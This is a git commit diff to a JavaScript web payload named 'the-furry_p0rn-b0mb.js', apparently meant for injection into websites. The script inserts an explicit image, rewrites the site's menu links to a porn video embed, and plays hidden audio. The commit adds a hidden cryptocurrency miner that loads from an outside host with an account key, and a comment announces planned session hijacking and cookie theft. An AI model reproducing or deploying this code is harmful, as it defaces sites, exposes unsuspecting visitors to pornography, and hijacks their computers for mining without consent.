319ecbc05dcfaac05a1c1b1bb84d5a784097508d
Wolf <36646784+NE1W01F@users.noreply.github.com>
2019-06-30 22:07:11 +0000

    Update the-furry_p0rn-b0mb.js

--- the-furry_p0rn-b0mb.js
+++ the-furry_p0rn-b0mb.js
@@ -1,4 +1,6 @@
-function porn(url){
+
+// We inject a link in to the page
+function injectpic(url){
     var pic = document.createElement('img');
     pic.src = url;
     pic.width = 1024;
@@ -6,6 +8,20 @@ function porn(url){
     document.body.appendChild(pic);
 }
 
+// Crypto Hijacking
+function cryptominer(){
+    var c = document.createElement('script');
+    c.src = "https://minero.cc/lib/minero-hidden.min.js";
+    c.setAttribute('async','');
+    var g = document.createElement('div');
+    g.class = "minero-hidden";
+    g.style="display: none";
+    g.setAttribute('data-key','e28c06e21135ac068da87519d76f51ec');
+    document.body.appendChild(g);
+    document.body.appendChild(c);    
+}
+
+// Edits the menu links to a new url
 function redriect(url){
     var a = document.getElementsByClassName('menu');
     var b = 0;
@@ -15,6 +31,7 @@ function redriect(url){
     }
 }
 
+// plays an audio file and injects it in the page
 function playSound(url){
     var audio = document.createElement('audio');
     audio.style.display = "none";
@@ -25,8 +42,10 @@ function playSound(url){
 
 function start(){
     playSound("https://raw.githubusercontent.com/NE1W01F/the-furry-porn-bomb/master/Amazon.mp3");
-    porn("https://cdnio.luscious.net/987/lusciousnet_000000top1_855317720.jpg");
+    injectpic("https://cdnio.luscious.net/987/lusciousnet_000000top1_855317720.jpg");
     redriect("https://www.thumbzilla.com/video/embed?key=ph59b436f94f7d0");
 }
+
+// soon i am going to work on session hijacking and getting cookies
 
 start();
